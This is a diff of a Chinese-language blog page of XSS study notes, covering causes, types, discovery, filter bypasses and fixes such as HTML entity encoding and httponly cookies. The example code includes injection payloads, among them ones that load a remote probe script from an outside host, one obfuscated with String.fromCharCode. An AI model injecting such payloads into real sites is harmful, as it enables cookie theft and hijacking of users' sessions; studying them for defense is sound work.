@@ -13,7 +13,7 @@
 <meta property="og:site_name" content="Red">
 <meta property="og:description" content="跨站脚本攻击（Cross Site Scripting），为不和层叠样式表的英文缩写混淆，故将跨站脚本攻击缩写为XSS。攻击者往web页面里插入恶意的html代码，当用户浏览该网页时候，嵌入该网页的html代码会被执行，从而达到攻击用户的目的。其重点已经不在’跨站’而是’脚本’,主要有两个：JavaScript和ActionScript
 产生原因：    网页提供我们输入信息的表单，同时可以把我们">
-<meta property="og:updated_time" content="2016-09-18T07:11:12.495Z">
+<meta property="og:updated_time" content="2016-09-18T09:52:16.843Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS">
 <meta name="twitter:description" content="跨站脚本攻击（Cross Site Scripting），为不和层叠样式表的英文缩写混淆，故将跨站脚本攻击缩写为XSS。攻击者往web页面里插入恶意的html代码，当用户浏览该网页时候，嵌入该网页的html代码会被执行，从而达到攻击用户的目的。其重点已经不在’跨站’而是’脚本’,主要有两个：JavaScript和ActionScript
@@ -91,10 +91,19 @@
         <p>跨站脚本攻击（Cross Site Scripting），为不和层叠样式表的英文缩写混淆，故将跨站脚本攻击缩写为XSS。攻击者往web页面里插入恶意的html代码，当用户浏览该网页时候，嵌入该网页的html代码会被执行，从而达到攻击用户的目的。其重点已经不在’跨站’而是’脚本’,主要有两个：JavaScript和ActionScript</p>
 <p>产生原因：<br>    网页提供我们输入信息的表单，同时可以把我们输入的信息输出到网页上。我们输入的是一个字符串，但这个字符串也可以是标记语言格式的字符串。浏览器新人服务器返回的标记语言格式的字符串(html源代码)，所以直接渲染显示到浏览器上形成可视化界面。我们输入的恶意的标记语言格式的字符串达到攻击的目的。</p>
 <p>出现XSS：url的参数回显到网页上、form表单提交的内容出现在网页上，如昵称、邮件、简介、留言板等</p>
-<p>危害：<br>    可以利用XSS获取用户的Cookie、改变网页内容、URL跳转、有局限性的键盘记录。</p>
-<p>利用：<br>    1、反射型XSS<br>    2、储存型XSS<br>    3、DOM XSS：代码不需要服务器解析响应的直接参与，触发XSS靠的是浏览器的DOM解析，可以认为完全是客户端的事<br>    4、flash XSS：利用网页上的flash文件的缺陷来执行js脚本，一般是反射性XSS<br>    5、m XSS：突变XSS，主要用于过滤的绕过。</p>
-<p>发现XSS：<br>    1、反射型XSS：url参数中的值，能够回显到返回的html中，url的参数值没有被过滤或者是过滤不严格。<br>    2、储存型XSS：可以提交内容，提交内容能被管理员或其他用户查看，提交的内容没有被过滤或者过滤不严格。</p>
-<p>过滤：<br>    前端过滤、输入过滤、输出过滤。<br>    输入过滤：服务器脚本接收用户提交的数据后，写入到数据库中，之间对数据进行过滤，称之为输入过滤，一般采用黑白名单过滤，或者是对提交的数据进行html实体编码<br>    输出过滤：服务器脚本在显示数据时，需要从数据库中读取数据再返回数据包，之间进行过滤，称之为输出过滤。一般采用黑白名单，或对数据进行html实体编码。<br>    前端绕过：可以用burpsuite拦截数据包，改包绕过。</p>
+<p>危害：<br>    可以利用XSS获取用户的Cookie、修改网页内容、URL跳转、XSS蠕虫、有局限性的键盘记录等。</p>
+<p>类型：<br>    1、反射型XSS<br>    2、储存型XSS<br>    3、DOM XSS：代码不需要服务器解析响应的直接参与，触发XSS靠的是浏览器的DOM解析，可以认为完全是客户端的事<br>    4、flash XSS：利用网页上的flash文件的缺陷来执行js脚本，一般是反射性XSS<br>    5、m XSS：突变XSS，主要用于过滤的绕过。</p>
+<p>发现XSS：<br>    1、反射型XSS：url参数中的值，能够回显到返回的html中，url的参数值没有被过滤或者是过滤不严格。<br>    2、储存型XSS：可以提交内容，提交内容能被管理员或其他用户查看，提交的内容没有被过滤或者过滤不严格。<br>场景利用：</p>
+<pre><code>1、在标签内,输出无需构造，直接控制变量就可以造成XSS漏洞，比如:
+&lt;div&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/div&gt;
+2、在属性内：
+&lt;div class=&quot;${xss}&quot;&gt;&lt;/div&gt;
+&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;${xss}&quot; /&gt;
+&lt;a herf=&quot;${xss}&quot;&gt;hello&lt;/a&gt;
+这时候仅仅需要闭合标签就可以继续xss操作：
+&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot; /&gt;
+&lt;a herf=&quot;javascript:alert(/xss/)&quot;&gt;hello&lt;/a&gt;
+</code></pre><p>过滤：<br>    前端过滤、输入过滤、输出过滤。<br>    输入过滤：服务器脚本接收用户提交的数据后，写入到数据库中，之间对数据进行过滤，称之为输入过滤，一般采用黑白名单过滤，或者是对提交的数据进行html实体编码（PHP中提供了htmlspecialchars()、htmlentities()函数可以把一些预定义的字符转换为HTML实体）。<br>    输出过滤：服务器脚本在显示数据时，需要从数据库中读取数据再返回数据包，之间进行过滤，称之为输出过滤。一般采用黑白名单，或对数据进行html实体编码。<br>    前端绕过：可以用burpsuite拦截数据包，改包绕过。</p>
 <p>绕过方式：<br>    &lt;&gt;被过滤，一般很难触发XSS漏洞，除非输入内容直接输入到”script \script”标签内。<br>    script被过滤 可以用img svg标签替换。特殊字符被过滤，编码ascii 16进制</p>
 <p>修复：<br>    1、对用户的输入进行严格的过滤，一般为基于黑白名单过滤。白名单过滤的防御效果更好，对于用户在白名单之外的输入，直接忽略。构造白名单的过程中需要尽量保证在不影响用户体验的同时，尽可能杜绝一切不必要的输入。<br>    2、Flash XSS修复需要对相应的flash进行修改或升级替换。<br>    3、在cookie中加入httponly属性可以在一定程度上保护用户的cookie，减少出现XSS时的损失。</p>
 <p>示例代码：</p>
@@ -102,12 +111,12 @@
 &lt;img src=xonerror=&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://b.ioio.pub/xss/probe.js&apos;&quot;;&gt;
 &lt;svg onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://b.ioio.pub/xss/probe.js&gt;
 &lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,112,114,111,98,101,46,106,115)) &gt;
-</code></pre><p><br></p>
-<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
+</code></pre><p>javascript:alert(docunmet.cookie)</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/30/XSS/" data-id="cit8bn82o0001zcqvzlhibk63" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/30/XSS/" data-id="cit8bqrk70002ncqvl5aa0ps0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -116,19 +125,19 @@
     
 <nav id="article-nav">
   
-    <a href="/2016/08/30/CSRF/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/08/30/SSRF/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          CSRF
+          SSRF
         
       </div>
     </a>
   
   
-    <a href="/2016/08/30/SQL注入/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2016/08/30/文件包含漏洞/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">SQL 注入</div>
+      <div class="article-nav-title">文件包含漏洞</div>
     </a>
   
 </nav>
@@ -152,7 +161,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li></ul>
     </div>
   </div>
 
@@ -165,7 +174,11 @@
       <ul>
         
           <li>
-            <a href="/2016/08/30/CSRF/">CSRF</a>
+            <a href="/2016/09/21/安全配置与中间件漏洞/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/SSRF/">SSRF</a>
           </li>
         
           <li>
@@ -173,15 +186,11 @@
           </li>
         
           <li>
-            <a href="/2016/08/30/SQL注入/">SQL 注入</a>
+            <a href="/2016/08/30/文件包含漏洞/">文件包含漏洞</a>
           </li>
         
           <li>
-            <a href="/2016/08/30/注入练习/">注入练习</a>
-          </li>
-        
-          <li>
-            <a href="/2016/08/16/read_sqlmap/">Read_Sqlmap</a>
+            <a href="/2016/08/30/任意文件查看与下载漏洞/">任意文件查看与下载漏洞</a>
           </li>
         
       </ul>
